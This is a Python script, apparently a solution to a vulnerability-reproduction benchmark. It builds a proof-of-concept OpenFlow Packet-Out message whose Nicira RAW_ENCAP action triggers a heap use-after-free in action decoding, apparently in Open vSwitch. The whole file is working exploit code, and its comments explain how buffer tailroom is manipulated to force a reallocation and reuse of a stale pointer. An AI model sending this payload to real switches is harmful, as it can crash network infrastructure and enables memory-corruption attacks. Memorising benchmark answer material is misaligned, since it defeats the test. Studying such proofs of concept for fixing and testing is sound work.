import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The PoC is a 72-byte OpenFlow Packet-Out message that triggers a
        # heap-use-after-free during action decoding. The total length is
        # composed of a 24-byte header and a 48-byte action payload.
        
        # 1. OpenFlow Header (8 bytes) & Packet-Out Body (16 bytes)
        # We construct a standard OFPT_PACKET_OUT message.
        ofp_header = struct.pack('>BBHI',
                                 0x04,  # version (OF 1.3)
                                 13,    # type (OFPT_PACKET_OUT)
                                 72,    # length (total message size)
                                 0)     # xid

        packet_out_body = struct.pack('>IIH6s',
                                      0xFFFFFFFF,  # buffer_id (OFP_NO_BUFFER)
                                      0xFFFFFFFD,  # in_port (OFPP_CONTROLLER)
                                      48,          # actions_len
                                      b'\x00' * 6)  # padding

        actions = b''

        # 2. Action 1: OFPAT_SET_FIELD (16 bytes on wire)
        # This action is chosen because its decoded size (28 bytes) is larger
        # than its wire size (16 bytes). This "expands" data in the decoding
        # buffer, allowing us to precisely control the buffer's remaining space.
        # After this action is decoded into a presumed 64-byte buffer, 36 bytes
        # of tailroom remain (64 - 28 = 36).
        # The on-wire length of the action must be a multiple of 8. The core
        # action is 12 bytes, so it's padded to 16. The 'len' field must be 16.
        set_field_header = struct.pack('>HH',
                                       25,   # type (OFPAT_SET_FIELD)
                                       16)   # len
        set_field_oxm = struct.pack('>HBB I',
                                    0x8000,      # oxm_class (OFPXMC_OPENFLOW_BASIC)
                                    3 << 1,      # oxm_field (OFPXMT_OFB_IN_PORT)
                                    4,           # oxm_length
                                    0xFFFFFFFD)  # oxm_value (OFPP_CONTROLLER)
        actions += set_field_header + set_field_oxm + b'\x00' * 4 # Padding to 16 bytes

        # 3. Action 2: NXAST_RAW_ENCAP (32 bytes on wire)
        # This is the vulnerable action. Its decoding triggers the UAF.
        # - The decoder first reserves 16 bytes for the action's base struct.
        #   The buffer has 36 bytes of tailroom, so this succeeds.
        #   The tailroom is now 20 bytes (36 - 16 = 20).
        # - Then, it decodes a property. The chosen property's decoded form
        #   requires more than 20 bytes, triggering a buffer reallocation.
        # - The stale pointer to the old buffer is then used, causing the crash.
        raw_encap_header_part1 = struct.pack('>HH I H',
                                             0xFFFF,      # type (OFPAT_EXPERIMENTER)
                                             32,          # len
                                             0x00002320,  # vendor (NX_VENDOR_ID)
                                             37)          # subtype (NXAST_RAW_ENCAP)
        
        # The 'props' start at offset 16 in the decoded struct. The length of
        # the property section on the wire is 8 bytes. This leads to an overall
        # action length of 18 (header) + 8 (props) = 26, padded to 32.
        raw_encap_header_part2 = struct.pack('>H B 3x H',
                                             0xFFFF,  # class
                                             0,       # encap_type
                                             8)       # props_len
        
        # The property itself is crafted to require more space than available
        # upon decoding. A simple 8-byte property is sufficient.
        prop = struct.pack('>HH4x',
                           1,  # type (OFP_ED_PROP_MIN_LEN)
                           8)  # len
        
        # Assemble the action: 18 (header) + 8 (prop) + 6 (padding) = 32 bytes
        actions += raw_encap_header_part1 + raw_encap_header_part2 + prop + b'\x00' * 6
        
        # Final PoC
        poc = ofp_header + packet_out_body + actions
        return poc
